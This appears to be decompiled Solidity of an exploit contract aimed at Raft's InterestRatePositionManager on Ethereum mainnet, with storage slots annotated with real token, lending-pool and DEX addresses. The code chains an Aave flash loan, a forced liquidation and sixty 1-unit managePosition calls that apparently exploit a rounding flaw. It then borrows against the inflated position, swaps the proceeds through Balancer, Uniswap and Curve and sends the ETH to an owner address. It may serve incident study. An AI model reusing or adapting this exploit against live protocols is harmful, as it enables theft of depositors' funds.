//0xfdc0feaa3f0830aa2756d943c6d7d39f1d587110

// Data structures and variables inferred from the use of storage instructions
uint256 stor_11; // STORAGE[0x11]
uint256 stor_0_0_19; // STORAGE[0x0] bytes 0 to 19 // 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 (WETH token contract)
uint256 stor_1_0_19; // STORAGE[0x1] bytes 0 to 19 // 0x6b175474e89094c44da98b954eedeac495271d0f (Dai token contract)
uint256 stor_2_0_19; // STORAGE[0x2] bytes 0 to 19 // 0x83f20f44975d03b1b09e64809b757c47f942beea (SavingsDai)
uint256 stor_3_0_19; // STORAGE[0x3] bytes 0 to 19 // 0xbe9895146f7af43049ca1c1ae358b0541ea49704 (Coinbase Wrapped Staked ETH (cbETH))
uint256 stor_4_0_19; // STORAGE[0x4] bytes 0 to 19 // 0xd0db31473caad65428ba301d2174390d11d0c788 (Raft Coinbase Wrapped Staked ETH rcbETH-c)
uint256 stor_6_0_19; // STORAGE[0x6] bytes 0 to 19 // 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 (USDC Token)
uint256 _onFlashLoan; // STORAGE[0x7] bytes 0 to 19 // 0x9ab6b21cdf116f611110b048987e58894786c244 (InterestRatePositionManager)
uint256 stor_8_0_19; // STORAGE[0x8] bytes 0 to 19 // 0x183015a9ba6ff60230fdeadc3f43b3d788b13e21 (RToken contract)
uint256 stor_9_0_19; // STORAGE[0x9] bytes 0 to 19 // 0x3cd40d6e8426c9f02fe7b23867661377e462df3d (PriceFeed)
uint256 stor_a_0_19; // STORAGE[0xa] bytes 0 to 19 // 0x87870bca3f3fd6335c3f4ce8392d69350b4fa4e2 (Aave Pool V3)
uint256 stor_c_0_19; // STORAGE[0xc] bytes 0 to 19 // 0x5fae7e604fc3e24fd43a72867cebac94c65b404a (Curve.fi Pool cbETH / wETH)
uint256 stor_d_0_19; // STORAGE[0xd] bytes 0 to 19 // 0xba12222222228d8ba445958a75a0704d566bf2c8 (Balancer v2 Vault)
uint256 stor_e_0_19; // STORAGE[0xe] bytes 0 to 19 //0x190ed02adaf1ef8039fcd3f006b42553467d5045 (UniswapV3Pool R stablecoin / USDC)
uint256 stor_f_0_19; // STORAGE[0xf] bytes 0 to 19 // 0x5777d92f208679db4b9778590fa3cab3ac9e2168 (UniswapV3Pool DAI / USDC)
uint256 stor_10_0_19; // STORAGE[0x10] bytes 0 to 19 // 0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640 (UniswapV3Pool wETH / USDC)
uint256 stor_1d_0_19; // STORAGE[0x1d] bytes 0 to 19 // 0xc1f2b71A502B551a65Eee9C96318aFdD5fd439fA (Owner)


function _SafeSub(uint256 varg0, uint256 varg1) private { 
    require(varg0 - varg1 <= varg0, Panic(17)); // arithmetic overflow or underflow
    return varg0 - varg1;
}

function _SafeMul(uint256 varg0, uint256 varg1) private { 
    require(!varg0 | (varg1 == varg0 * varg1 / varg0), Panic(17)); // arithmetic overflow or underflow
    return varg0 * varg1;
}

function () public payable { 
    revert();
}

function onFlashLoan(address varg0, address varg1, uint256 varg2, uint256 varg3, bytes varg4) public nonPayable { ;
    v0 = stor_a_0_19.deposit(stor_1_0_19, 0x295be96e64066972000000, address(this), uint16(0)).gas(msg.gas);
    v1 = stor_a_0_19.borrow(stor_3_0_19, 0x3976747fe11a100000, 2, uint16(0), address(this)).gas(msg.gas);
    v2, /* uint256 */ v3 = stor_3_0_19.balanceOf(address(this)).gas(msg.gas);
    v4 = stor_3_0_19.transfer(_onFlashLoan, v3).gas(msg.gas);
    if (address(varg4[0]) - address(0x0)) {
        v5 = _onFlashLoan.liquidate(address(varg4[0])).gas(msg.gas);
    } else {
        v6 = _SafeSub(stor_11, 1);
        v7 = _onFlashLoan.liquidate(address(STORAGE[v6 + 18])).gas(msg.gas);
    }
    v8, /* uint256 */ v9 = stor_4_0_19.balanceOf(address(this)).gas(msg.gas);
    v10 = _onFlashLoan.managePosition(stor_3_0_19, address(this), 1, bool(1), 0, bool(1), 0xde0b6b3a7640000, address(0x0), 0, 0, uint8(0), 0, 0).gas(msg.gas);
    v11 = _SafeSub(v9, 0x1bc16d674ec80000);
    v12 = _onFlashLoan.managePosition(stor_3_0_19, address(this), v11, bool(0), 0, bool(1), 0xde0b6b3a7640000, address(0x0), 0, 0, uint8(0), 0, 0).gas(msg.gas);
    v13, /* uint256 */ v14 = stor_a_0_19.repay(stor_3_0_19, uint256.max, 2, address(this)).gas(msg.gas);
    v15 = stor_a_0_19.withdraw(stor_1_0_19, 0x295be96e64066972000000, address(this)).gas(msg.gas);
    return 0;
}

function 0x3f6a5f0e() public payable { 
    v0, /* uint256 */ v1 = stor_8_0_19.balanceOf(address(this)).gas(msg.gas);
    v2 = _SafeSub(v1, 0xd8d726b7177a800000);
    v3 = new struct(6);
    v3.word0 = 0x20a61b948e33879ce7f23e535cc7baa3bc66c5a9000000000000000000000555;
    v3.word1 = uint8(0);
    v3.word2 = stor_8_0_19;
    v3.word3 = stor_1_0_19;
    v3.word4 = v2;
    v4 = new struct(1);
    v4.word0 = 0;
    v3.word5 = v4;
    v5 = new uint256[](v3.word0);
    MEM[v5.data] = uint8(v3.word1);
    v6 = v7 = 0;
    v8, /* uint256 */ v9 = stor_d_0_19.swap(v5 + 0, address(this), bool(0), address(this), bool(0), 0, block.timestamp, v10, v10, address(v3.word2), address(v3.word3), v3.word4, 192, MEM[v3.word5]).gas(msg.gas);
    v11, /* uint256 */ v12 = stor_1_0_19.balanceOf(address(this)).gas(msg.gas);
    v13 = new uint256[](0);
    v14 = stor_f_0_19.swap(address(this), bool(1), v12, address(0x105a984f6e821f6020a2), v13).gas(msg.gas);
    v15, /* uint256 */ v16 = stor_6_0_19.balanceOf(address(this)).gas(msg.gas);
    v17 = new uint256[](0);
    v18 = stor_10_0_19.swap(address(this), bool(1), v16, address(0x504c51b4dafffe33592d97ebecb3), v17).gas(msg.gas);
    v19, /* uint256 */ v20 = stor_0_0_19.balanceOf(address(this)).gas(msg.gas);
    v21 = stor_0_0_19.withdraw(v20).gas(msg.gas);
}

function CALLBACK_SUCCESS() public nonPayable { 
    return 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9;
}

function 0xa64ed556(uint256 varg0, uint256 varg1) public nonPayable { 
    v0 = new struct(6);
    v0.word0 = 0x52b69d6b3eb0bd6b2b4a48a316dfb0e1460e67e40002000000000000000005f3;
    v0.word1 = uint8(0);
    v0.word2 = stor_8_0_19;
    v0.word3 = stor_2_0_19;
    v1 = _SafeMul(varg0, 0xde0b6b3a7640000);
    v0.word4 = v1;
    v2 = new struct(1);
    v2.word0 = 0;
    v0.word5 = v2;
    v3 = new uint256[](v0.word0);
    MEM[v3.data] = uint8(v0.word1);
    v6, /* uint256 */ v7 = stor_d_0_19.swap(v3 + 0, address(this), bool(0), address(this), bool(0), 0x1925734d5b8904b800000, block.timestamp, v8, v8, address(v0.word2), address(v0.word3), v0.word4, 192, MEM[v0.word5]).gas(msg.gas);
    v9 = new struct(6);
    v9.word0 = 0x20a61b948e33879ce7f23e535cc7baa3bc66c5a9000000000000000000000555;
    v9.word1 = uint8(0);
    v9.word2 = stor_8_0_19;
    v9.word3 = stor_1_0_19;
    v10 = _SafeMul(varg1, 0xde0b6b3a7640000);
    v9.word4 = v10;
    v11 = new struct(1);
    v11.word0 = 0;
    v9.word5 = v11;
    v12 = new uint256[](v9.word0);
    MEM[v12.data] = uint8(v9.word1);
    MEM[v12 + 192 + 32 + MEM[v9.word5]] = 0;
    v15, /* uint256 */ v16 = stor_d_0_19.swap(v12 + 0, address(this), bool(0), address(this), bool(0), 0xe8ef1e96ae3897800000, block.timestamp, v8, v8, address(v9.word2), address(v9.word3), v9.word4, 192, MEM[v9.word5]).gas(msg.gas);
    v18 = stor_e_0_19.swap(address(this), bool(1), 0x2a5a058fc295ed000000, address(0x41546a0224c275318b), v17).gas(msg.gas);
    v19, /* uint256 */ v20 = stor_2_0_19.balanceOf(address(this)).gas(msg.gas);
    v21, /* uint256 */ v22 = stor_2_0_19.redeem(v20, address(this), address(this)).gas(msg.gas);
    v23, /* uint256 */ v24 = stor_1_0_19.balanceOf(address(this)).gas(msg.gas);
    v25 = new uint256[](0);
    v26 = stor_f_0_19.swap(address(this), bool(1), v24, address(0x105a984f6e821f6020a2), v25).gas(msg.gas);
    v27, /* uint256 */ v28 = stor_6_0_19.balanceOf(address(this)).gas(msg.gas);
    v29 = new uint256[](0);
    v30 = stor_10_0_19.swap(address(this), bool(1), v28, address(0x504c51b4dafffe33592d97ebecb3), v29).gas(msg.gas);
    v31, /* uint256 */ v32 = stor_0_0_19.balanceOf(address(this)).gas(msg.gas);
    v33 = stor_0_0_19.withdraw(v32).gas(msg.gas);
    v34 = stor_c_0_19.exchange(0, 1, 0x4563918244f40000, '>s6(qB', bool(1), address(this)).value(0x4563918244f40000).gas(msg.gas);
    v35 = stor_1d_0_19.call().value(this.balance).gas(!this.balance * 2300);
}

function 0xee4d195d() public nonPayable { 
    v0 = v1 = 0;
    while (v0 < 60) {
        v2 = _onFlashLoan.managePosition(stor_3_0_19, address(this), 1, bool(1), 0, bool(1), 0xde0b6b3a7640000, address(0x0), 0, 0, uint8(0), 0, 0).gas(msg.gas);
        v0 = v0 + 1;
    }
    v3, /* uint256 */ v4 = stor_3_0_19.balanceOf(_onFlashLoan).gas(msg.gas);
    v5 = _onFlashLoan.managePosition(stor_3_0_19, address(this), v4, bool(0), 0, bool(1), 0xde0b6b3a7640000, address(0x0), 0, 0, uint8(0), 0, 0).gas(msg.gas);
    v6, /* uint256 */ v7, /* uint256 */ v8 = stor_9_0_19.fetchPrice().gas(msg.gas);
    v9, /* uint256 */ v10 = stor_4_0_19.balanceOf(address(this)).gas(msg.gas);
    v11 = _SafeMul(v10, v7);
    v12 = _onFlashLoan.managePosition(stor_3_0_19, address(this), 0, bool(1), v11 / 0x122e0e0f2fc30000, bool(1), 0xde0b6b3a7640000, address(0x0), 0, 0, uint8(0), 0, 0).gas(msg.gas);
}
